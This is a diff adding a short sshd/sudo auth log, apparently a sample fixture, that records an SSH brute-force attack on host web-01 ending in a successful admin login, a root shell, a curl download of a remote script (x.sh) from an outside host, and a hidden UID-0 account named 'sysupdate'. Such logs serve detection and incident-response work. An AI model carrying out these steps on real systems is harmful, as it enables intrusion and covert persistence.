@@ -1,0 +1,16 @@
+Oct 10 11:20:01 web-01 sshd[7101]: Failed password for root from 203.0.113.45 port 40211 ssh2
+Oct 10 11:20:03 web-01 sshd[7102]: Failed password for admin from 203.0.113.45 port 40213 ssh2
+Oct 10 11:20:05 web-01 sshd[7103]: Failed password for invalid user test from 203.0.113.45 port 40215 ssh2
+Oct 10 11:20:07 web-01 sshd[7104]: Failed password for invalid user oracle from 203.0.113.45 port 40217 ssh2
+Oct 10 11:20:09 web-01 sshd[7105]: Failed password for invalid user git from 203.0.113.45 port 40219 ssh2
+Oct 10 11:20:11 web-01 sshd[7106]: Failed password for invalid user ubuntu from 203.0.113.45 port 40221 ssh2
+Oct 10 11:20:13 web-01 sshd[7107]: Failed password for root from 203.0.113.45 port 40223 ssh2
+Oct 10 11:20:15 web-01 sshd[7108]: Failed password for admin from 203.0.113.45 port 40225 ssh2
+Oct 10 11:20:17 web-01 sshd[7109]: Failed password for invalid user postgres from 203.0.113.45 port 40227 ssh2
+Oct 10 11:20:19 web-01 sshd[7110]: Failed password for root from 203.0.113.45 port 40229 ssh2
+Oct 10 11:20:21 web-01 sshd[7111]: Failed password for admin from 203.0.113.45 port 40231 ssh2
+Oct 10 11:20:23 web-01 sshd[7112]: Failed password for admin from 203.0.113.45 port 40233 ssh2
+Oct 10 11:20:41 web-01 sshd[7120]: Accepted password for admin from 203.0.113.45 port 40240 ssh2
+Oct 10 11:21:02 web-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Oct 10 11:21:30 web-01 sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.99/x.sh
+Oct 10 11:22:05 web-01 useradd[7190]: new user: name=sysupdate, UID=0, GID=0, home=/root, shell=/bin/bash
